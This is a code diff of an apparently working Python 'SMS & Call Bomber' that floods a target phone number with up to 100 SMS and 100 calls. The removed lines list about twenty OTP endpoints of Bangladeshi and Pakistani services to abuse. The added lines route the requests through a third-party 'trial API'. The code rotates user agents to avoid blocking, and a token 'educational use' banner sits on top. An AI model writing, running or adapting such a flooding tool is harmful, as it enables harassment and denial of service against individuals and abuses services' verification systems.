@@ -16,44 +16,32 @@ class Colors:
 # "SM" ASCII Art
 SM_ART = f"""
 {Colors.CYAN}
-
-
                           _____ __  __ 
                         / ____|  \/  |
                        | (___ | \✨/ |
                         \___ \| |\/| |
                         ____) | |  | |
                        |_____/|_|  |_|
-        
-        
-                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM Bomber ==={Colors.RESET}
+
+                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM & Call Bomber ==={Colors.RESET}
                  Coded by: SM 🍁 
                  For Educational Use Only!
 """
 
-# All APIs (including Bangladeshi and Pakistani services)
+# New API configuration
 APIs = [
-    {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Sheba.xyz OTP", "url": "https://sheba.xyz/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Bikroy OTP", "url": "https://bikroy.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Foodpanda OTP", "url": "https://www.foodpanda.com.bd/api/v2/otp/send", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Pickaboo OTP", "url": "https://www.pickaboo.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "ShopUp OTP", "url": "https://www.shopup.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Meena Bazar OTP", "url": "https://meenabazar.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Daraz Pakistan OTP", "url": "https://daraz.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Viber OTP", "url": "https://viber.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "EasyPaisa OTP", "url": "https://www.easypaisa.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Telenor OTP", "url": "https://www.telenor.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Jazz OTP", "url": "https://www.jazz.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {
+        "name": "Trial API SMS",
+        "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
+        "method": "GET",
+        "params": {"phone": "{number}", "type": "sms"}
+    },
+    {
+        "name": "Trial API Call",
+        "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
+        "method": "GET",
+        "params": {"phone": "{number}", "type": "call"}
+    }
 ]
 
 # Random User-Agents
@@ -70,14 +58,13 @@ def validate_phone(phone):
 
 def send_request(api, phone):
     url = api["url"]
-    data = json.loads(json.dumps(api["data"]).replace("{number}", phone))
+    params = {key: value.replace("{number}", phone) for key, value in api["params"].items()}
     headers = {
-        "Content-Type": "application/json",
         "User-Agent": random.choice(USER_AGENTS),
     }
 
     try:
-        response = requests.post(url, json=data, headers=headers, timeout=10)
+        response = requests.get(url, params=params, headers=headers, timeout=10)
         if response.status_code < 400:
             return {"success": True, "status": "Success"}
         else:
@@ -96,13 +83,14 @@ def main():
         input("Press Enter to exit...")
         return
 
-    # Message count input
+    # Count input for SMS and Calls
     try:
-        count = int(input(f"{Colors.CYAN}Enter number of messages (1-100): {Colors.RESET}").strip())
-        if not 1 <= count <= 100:
+        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS (1-100): {Colors.RESET}").strip())
+        call_count = int(input(f"{Colors.CYAN}Enter number of Calls (1-100): {Colors.RESET}").strip())
+        if not (1 <= sms_count <= 100 and 1 <= call_count <= 100):
             raise ValueError
     except ValueError:
-        print(f"{Colors.RED}Invalid count! Must be between 1 and 100.{Colors.RESET}")
+        print(f"{Colors.RED}Invalid count! Both must be between 1 and 100.{Colors.RESET}")
         input("Press Enter to exit...")
         return
 
@@ -112,22 +100,26 @@ def main():
         if delay < 0:
             raise ValueError
     except ValueError:
-        print(f"{Colors.RED}Invalid delay! Must be a non-negative number.{Colors.RESET}")
+        print(f"{Colors.RED}ición:1 Invalid delay! Must be a non-negative number.{Colors.RESET}")
         input("Press Enter to exit...")
         return
 
-    print(f"\n{Colors.YELLOW}Starting SMS bombing to {phone} with {count} messages (delay: {delay}s)...{Colors.RESET}")
+    total_requests = sms_count + call_count
+    print(f"\n{Colors.YELLOW}Starting bombing to {phone} with {sms_count} SMS and {call_count} calls (delay: {delay}s)...{Colors.RESET}")
 
-    for i in range(count):
-        api = random.choice(APIs)  # Randomly select an API for each message
+    # Create a list of requests (SMS and Call)
+    request_list = ([APIs[0]] * sms_count) + ([APIs[1]] * call_count)
+    random.shuffle(request_list)  # Shuffle to mix SMS and calls
+
+    for i, api in enumerate(request_list):
         result = send_request(api, phone)
         if result["success"]:
-            print(f"{Colors.GREEN}[{i+1}/{count}] {api['name']}: Success{Colors.RESET}")
+            print(f"{Colors.GREEN}[{i+1}/{total_requests}] {api['name']}: Success{Colors.RESET}")
         else:
-            print(f"{Colors.RED}[{i+1}/{count}] {api['name']}: Failed{Colors.RESET}")
+            print(f"{Colors.RED}[{i+1}/{total_requests}] {api['name']}: Failed{Colors.RESET}")
         time.sleep(delay + random.uniform(0, 1))  # Delay + random 0-1s
 
-    print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
+    print(f"\n{Colors.GREEN}SMS and Call bombing completed successfully!{Colors.RESET}")
     input("Press Enter to exit...")
 
 if __name__ == "__main__":
